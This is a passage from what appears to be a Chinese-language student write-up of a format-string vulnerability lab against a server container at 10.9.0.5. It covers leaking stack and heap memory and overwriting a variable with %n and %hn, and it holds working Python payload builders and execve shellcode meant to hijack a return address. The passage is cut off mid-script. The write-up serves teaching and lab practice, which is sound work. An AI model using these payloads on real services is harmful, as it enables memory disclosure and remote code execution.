alt="image-20211203161440201"></p></li><li><p>给定一个使程序崩溃的输入</p><p>可以看到程序没有正常返回，因为格式化规定符是%s，print()函数会把va_list指向的值看做一个地址，并打印出该地址中的字符串，因为我们没有提供参数，va_list会向上移动到一个不合法地址,导致程序崩溃</p><p><img src="/posts/35f73974/image-20211203163309406.png" alt="image-20211203163309406"></p></li></ul><h1 id="task-2-printing-out-the-server-programs-memory"><a class="markdownIt-Anchor" href="#task-2-printing-out-the-server-programs-memory"></a> Task 2: Printing Out the Server Program’s Memory</h1><p>这个任务的目标是让服务器从它的内存中打印出一些数据(我们将继续使用10.9.0.5)。数据将在服务器端打印出来，因此攻击者无法看到它。因此，这不是一个有意义的攻击，但是在这个任务中使用的技术对于后续的任务是至关重要的。</p><h2 id="task-2a-stack-data"><a class="markdownIt-Anchor" href="#task-2a-stack-data"></a> Task 2.A: Stack Data</h2><p>目标是打印出堆栈上的数据。考虑需要多少%x格式化说明符才能让服务器程序打印出输入的前四个字节?</p><p>可以在那里放置一些唯一的数字(4字节)，这样当它们被打印出来时，就可以立即知道。这个数字对于大多数后续的任务来说都是至关重要的，所以请确保正确使用它。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Initialize the content array</span><br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># This line shows how to store a 4-byte integer at offset 0</span><br>number  = <span class="hljs-number">0x33333333</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to store a 4-byte string at offset 4</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;abcd&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to construct a string s with</span><br><span class="hljs-comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span><br>s= <span class="hljs-string">&quot;.%.8x&quot;</span>*<span class="hljs-number">100</span> + <span class="hljs-string">&quot;\n&quot;</span><br><br><span class="hljs-comment"># The line shows how to store the string s at offset 8</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211203190158456.png" alt="image-20211203190158456"></p><p>由图中可以看出我们需要64个%x才能打印出buf前四个字节的值</p><h2 id="task-2b-heap-data"><a class="markdownIt-Anchor" href="#task-2b-heap-data"></a> Task 2.B: Heap Data</h2><p>在堆区域中存储了一条秘密消息(一个字符串)，您可以从服务器打印输出中找到该字符串的地址。你的工作是打印出这条秘密信息。要实现这个目标，您需要将秘密消息的地址(以二进制形式)放在格式字符串中。</p><p>从上图可以看出，秘密信息地址为0x080b4008,我们将其作为下面number的值</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Initialize the content array</span><br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># This line shows how to store a 4-byte integer at offset 0</span><br>number  = <span class="hljs-number">0x080b4008</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to store a 4-byte string at offset 4</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;abcd&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to construct a string s with</span><br><span class="hljs-comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span><br>s= <span class="hljs-string">&quot;.%.8x&quot;</span>*<span class="hljs-number">63</span> + <span class="hljs-string">&quot;%s&quot;</span><br><br><span class="hljs-comment"># The line shows how to store the string s at offset 8</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211203191747742.png" alt="image-20211203191747742"></p><h1 id="task-3-modifying-the-server-programs-memory"><a class="markdownIt-Anchor" href="#task-3-modifying-the-server-programs-memory"></a> Task 3: Modifying the Server Program’s Memory</h1><p>这个任务的目标是修改在服务器程序中定义的target变量的值(我们将继续使用10.9.0.5)。target的原始值是0x11223344。假设该变量包含一个重要的值，该值可以影响程序的控制流。如果远程攻击者可以改变它的值，他们就可以改变这个程序的行为。我们有三个子任务。</p><p>基础知识</p><blockquote><p>%n:这个格式规定符会把目前打印出的字符的个数写入内存，内存地址由其后面的参数给出</p><p>eg. printf(“hello%n”,&amp;i),会打印出hello,然后i=5;</p></blockquote><p>实验目标，我们需要先知道要修改的内存的地址，然后将其存在number中,这个是buffer的前四个字节，我们已经知道了需要64个%x才能将其输出</p><h2 id="task-3a修改为其他值"><a class="markdownIt-Anchor" href="#task-3a修改为其他值"></a> Task 3.A:修改为其他值。</h2><p>在这个子任务中，我们需要将target变量的内容更改为其他内容。如果你能把它改成一个不同的值，不管这个值是什么，我们的任务都被认为是成功的。目标变量的地址可以从服务器打印输出中找到。</p><p>有上面的输出可以看出，target变量的地址为<code>0x080e5068</code>,我们将number设为这个值</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Initialize the content array</span><br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># This line shows how to store a 4-byte integer at offset 0</span><br>number  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to store a 4-byte string at offset 4</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;abcd&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to construct a string s with</span><br><span class="hljs-comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span><br>s= <span class="hljs-string">&quot;.%.8x&quot;</span>*<span class="hljs-number">63</span> + <span class="hljs-string">&quot;%n&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span><br><br><span class="hljs-comment"># The line shows how to store the string s at offset 8</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211203194004097.png" alt="image-20211203194004097"></p><p>根据上面的%n的原理，我们输出了0x4+0x4+(0x8+0x1)×63=0x23f个字符，所以target被修改为0x0000023f。</p><p>其中加的0x1使我们为了便于观察加的用来隔断的<code>'.'</code>。</p><h2 id="task-3a修改为0x5000"><a class="markdownIt-Anchor" href="#task-3a修改为0x5000"></a> Task 3.A:修改为0x5000。</h2><p>在这个子任务中，我们需要将target变量的内容更改为一个特定的值0x5000。只有当变量的值变为0x5000时，我们的任务才被认为成功。</p><p>0x5000-0x23f=19905</p><p>我们将一个.%.8x变成19905+9=19914个字符宽度的%.19914x，其实读的还是八个字符，但是输出宽度为19976的宽度，这样可以保证%n对应地址不变的情况下，改变target对应的值。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Initialize the content array</span><br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># This line shows how to store a 4-byte integer at offset 0</span><br>number  = <span class="hljs-number">0x080e5068</span> <br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to store a 4-byte string at offset 4</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;abcd&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to construct a string s with</span><br><span class="hljs-comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span><br>s = <span class="hljs-string">&quot;.%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.19914x&quot;</span>  +<span class="hljs-string">&quot;%n&quot;</span> +<span class="hljs-string">&quot;\n&quot;</span><br><br><span class="hljs-comment"># The line shows how to store the string s at offset 8</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211203194611966.png" alt="image-20211203194611966"></p><h2 id="task-3a修改为0xaabbccdd"><a class="markdownIt-Anchor" href="#task-3a修改为0xaabbccdd"></a> Task 3.A:修改为“0xaabbccdd”。</h2><p>这个子任务与前一个类似，只是目标值现在很大。在格式字符串攻击中，这个值是printf()函数输出的字符总数;打印这么多字符可能需要几个小时。你需要使用更快的方法。其基本思想是使用%hnor%hhn而不是%n，这样我们就可以修改两个字节(或一个字节)的内存空间，而不是四个字节。打印216个字符不需要花很多时间。更多细节可以在SEED书中找到。</p><p>因为增加了一个四位宽的地址，所以现在的输出字符宽度为0x23f+0x4=0x243</p><p>再将一个&quot;.%.8x&quot;改成&quot;%hn&quot;所以要加0x9</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Initialize the content array</span><br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>number  = <span class="hljs-number">0x080e5068</span> <span class="hljs-comment"># target地址（小端法，读两个字节就是0x5068）</span><br>number2 = number+<span class="hljs-number">2</span>   <span class="hljs-comment"># target前2个字节地址</span><br>high=<span class="hljs-number">0xAABB</span><br>low=<span class="hljs-number">0xCCDD</span><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number2).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># This line shows how to store a 4-byte string at offset 4</span><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;abcd&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># This line shows how to construct a string s with</span><br><span class="hljs-comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span><br>s = <span class="hljs-string">&quot;.%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.&quot;</span>+ <span class="hljs-built_in">str</span>(high-<span class="hljs-number">0x243</span>+<span class="hljs-number">0x9</span>) +<span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> +<span class="hljs-string">&quot;%.&quot;</span>+ <span class="hljs-built_in">str</span>(low-high) +<span class="hljs-string">&quot;x&quot;</span>  +<span class="hljs-string">&quot;%hn&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span><br><br><span class="hljs-comment"># The line shows how to store the string s at offset 8</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment"># Write the content to badfile</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211203203556337.png" alt="image-20211203203556337"></p><h1 id="task-4-inject-malicious-code-into-the-server-program"><a class="markdownIt-Anchor" href="#task-4-inject-malicious-code-into-the-server-program"></a> Task 4: Inject Malicious Code into the Server Program</h1><p>现在，我们已经准备好开始攻击的核心——代码注入。我们想要将一段恶意代码以二进制格式注入到服务器的内存中，然后使用格式字符串漏洞修改函数的返回地址字段，这样当函数返回时，它跳转到我们注入的代码。此任务使用的技术与前一个任务相似:它们都修改内存中的4字节数。前面的任务修改target变量，而这个任务修改函数的返回地址字段。我们需要根据服务器打印的信息找出返回地址字段的地址。</p><h2 id="61-理解栈布局"><a class="markdownIt-Anchor" href="#61-理解栈布局"></a> 6.1 理解栈布局</h2><p><img src="/posts/35f73974/image-20211203204501991.png" alt="image-20211203204501991"></p><h3 id="question-1"><a class="markdownIt-Anchor" href="#question-1"></a> Question 1:</h3><p><strong>在1和2标记的位置的内存地址是什么?</strong></p><p>1：从上面的输出可以很容易看出是<code>0xffffd2c0</code></p><p>2：<code>myprintf</code>的ebp为<code>0xffffd1e8</code>，所以返回地址为0xffffd1e8+4=0xffffd0fc</p><h3 id="question-2"><a class="markdownIt-Anchor" href="#question-2"></a> Question 2:</h3><p><strong>我们需要多少%x格式说明符来移动格式字符串参数指针到3?记住，实参指针从1上面的位置开始</strong></p><p>我们需要 64 个<code>%x</code>才能移动格式化字符串的参数指针到 3 ，也就是<code>buf</code>的地址</p><h2 id="62-shellcode"><a class="markdownIt-Anchor" href="#62-shellcode"></a> 6.2 shellcode</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">0</span>               <span class="hljs-comment"># Change this number</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment">############################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    Construct the format string here</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment">############################################################</span><br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><h2 id="63-task"><a class="markdownIt-Anchor" href="#63-task"></a> 6.3 task</h2><h3 id="让服务器运行shellcode"><a class="markdownIt-Anchor" href="#让服务器运行shellcode"></a> 让服务器运行shellcode</h3><p>首先在查看一遍各个参数的地址</p><p><img src="/posts/35f73974/image-20211204162734497.png" alt="image-20211204162734497"></p><p>我们的任务是构建badfile给服务器程序，让服务器执行shellcode。</p><p>**设计原理：**我们需要知道mypritf的返回地址，然后将这个地址放在number处，并通过修改将其变成我们存放shellcode的地址</p><ul><li><p>由上图我们可知<code>myprintf()</code>的返回地址为：<code>0xffffd398+0x4=0xffffd39c</code></p></li><li><p>将shellcode放在数组最后，shellcode的起始地址为：</p><p>0xffffd470+1364(可以打印出shellcode的长度来看）=0xffffD9C4</p></li><li><p>所以我们的目标就是将返回地址修改为shellcode的起始地址</p><ul><li><p>high=0xFFFF          #shellcode高地址</p></li><li><p>low=0xD9C4#shellcode低地址</p></li><li><p>第63个%x前的系数：high-0x243+0x9</p></li><li><p>第64个%x前的系数：low+0x10000-high（因为low小于high，所以要加0x10000)</p></li><li><p>可以使用<code>build_string.py</code>文件来检测计算值</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span 